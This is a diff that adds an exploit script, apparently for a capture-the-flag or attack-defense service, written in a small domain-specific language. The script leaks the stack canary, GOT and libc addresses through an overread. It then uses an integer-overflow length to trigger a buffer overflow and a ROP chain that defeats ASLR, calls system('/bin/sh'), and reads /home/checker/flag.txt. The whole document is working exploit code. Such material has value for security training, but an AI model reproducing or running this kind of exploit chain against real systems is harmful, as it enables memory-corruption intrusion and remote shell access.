@@ -1,0 +1,89 @@
+act leak():
+  u32 first_choice = 3:u32
+  u32 len_to_print = 0x100:u32
+  bv garbage = "a" x 31
+  bv payload = first_choice . len_to_print . garbage
+  
+  write(payload)
+  delay(200)
+  
+  read("\n\n\n")
+  read(32)
+  
+  bv leak_canary           = read(4)
+  read(4)
+  bv leak_GOT_address      = read(4)
+  bv leak_Stack_pointer    = read(4)
+  bv leak_saved_eip        = read(4)
+  read(4 * 5)
+  bv leak_io_reference     = read(4)
+  bv leak_ld_reference     = read(4)
+  bv leak_libcso_reference = read(4)
+  
+  dbgascii "===== LEAKED VALUES ====="
+  dbgascii "leak_canary          :"
+  dbghex leak_canary
+  dbgascii "leak_GOT_address     :"
+  dbghex leak_GOT_address
+  dbgascii "leak_Stack_pointer   :"
+  dbghex leak_Stack_pointer
+  dbgascii "leak_saved_eip       :"
+  dbghex leak_saved_eip
+  dbgascii "leak_io_reference    :"
+  dbghex leak_io_reference
+  dbgascii "leak_ld_reference    :"
+  dbghex leak_ld_reference
+  dbgascii "leak_libcso_reference:"
+  dbghex leak_libcso_reference
+
+  u32 int_canary            = leak_canary
+  u32 int_GOT_address       = leak_GOT_address
+  u32 int_Stack_pointer     = leak_Stack_pointer
+  u32 int_saved_eip         = leak_saved_eip
+  u32 int_io_reference      = leak_io_reference
+  u32 int_ld_reference      = leak_ld_reference
+  u32 int_libcso_reference  = leak_libcso_reference
+
+
+  u32 PUTS_PLT    = int_saved_eip   -   838:u32
+  u32 MAIN        = int_saved_eip   +    11:u32
+  u32 PUTS_GOT    = int_GOT_address +  0x24:u32
+  u32 POP_EBX_RET = MAIN            - 0x3c3:u32
+
+  bv leak_puts_libc = "a"x64 . int_canary . 0:u32 . 0:u32 . 0:u32 . POP_EBX_RET . int_GOT_address . PUTS_PLT . MAIN . PUTS_GOT
+  bv go_to_BOF      = 2:u32 . 0x80000019:u32
+  // 0x80000019 << 2 & 0xffffffff = size(leak_puts_libc)
+  
+  read(-1)
+
+  write(go_to_BOF)
+  write(leak_puts_libc)
+  bv leaked_puts_libc = read(4)
+  u32 ASLR_PUTS_LIBC = leaked_puts_libc
+
+  u32 LIBC_PUTS_OFFSET   = 0x0007dd60:u32
+  u32 LIBC_SYSTEM_OFFSET = 0x00051f50:u32
+  u32 LIBC_BINSH_OFFSET  = 0x1cce52:u32
+
+  u32 LIBC_BASE = ASLR_PUTS_LIBC - LIBC_PUTS_OFFSET
+
+  u32 ASLR_SYSTEM = LIBC_BASE + LIBC_SYSTEM_OFFSET
+  u32 ASLR_BINSH  = LIBC_BASE + LIBC_BINSH_OFFSET
+  u32 ASLR_PUTS   = LIBC_BASE + LIBC_PUTS_OFFSET 
+
+  bv spawn_bin_sh = "a"x64 . int_canary . 0:u32 . 0:u32 . 0:u32 . ASLR_SYSTEM . 0xdeadbeef:u32 . ASLR_BINSH
+  go_to_BOF := 2:u32 . 0x80000017:u32
+
+  read(-1)
+  write(go_to_BOF)
+  delay(100)
+  write(spawn_bin_sh)
+  delay(100)
+  write("ls\n")
+  delay(100)
+  write("cat /home/checker/flag.txt\n")
+  delay(100)
+  return read(-1)
+
+submit:
+  return leak()
